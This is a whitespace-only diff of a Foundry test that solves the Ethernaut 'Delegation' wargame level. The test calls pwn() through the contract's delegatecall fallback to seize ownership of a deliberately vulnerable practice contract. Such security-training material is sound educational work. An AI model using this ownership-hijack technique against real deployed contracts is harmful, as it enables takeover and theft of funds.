@@ -7,16 +7,16 @@ import {Delegation} from "../src/levels/Delegation.sol";
 
 contract DelegationTest is EthernautTest {
     function setUpLevel() public override {
-	DelegationFactory factory = new DelegationFactory();
-	ethernaut.registerLevel(factory);
-	levelAddress = ethernaut.createLevelInstance(factory);
+        DelegationFactory factory = new DelegationFactory();
+        ethernaut.registerLevel(factory);
+        levelAddress = ethernaut.createLevelInstance(factory);
     }
 
     function testSolveDelegation() public {
-	Delegation parity = Delegation(payable(levelAddress));
-	vm.startPrank(address(this));
-	(bool success, ) = address(parity).call(abi.encodeWithSignature("pwn()"));
-	assert(success);
-	assert(ethernaut.submitLevelInstance(payable(levelAddress)));
+        Delegation parity = Delegation(payable(levelAddress));
+        vm.startPrank(address(this));
+        (bool success,) = address(parity).call(abi.encodeWithSignature("pwn()"));
+        assert(success);
+        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
     }
 }
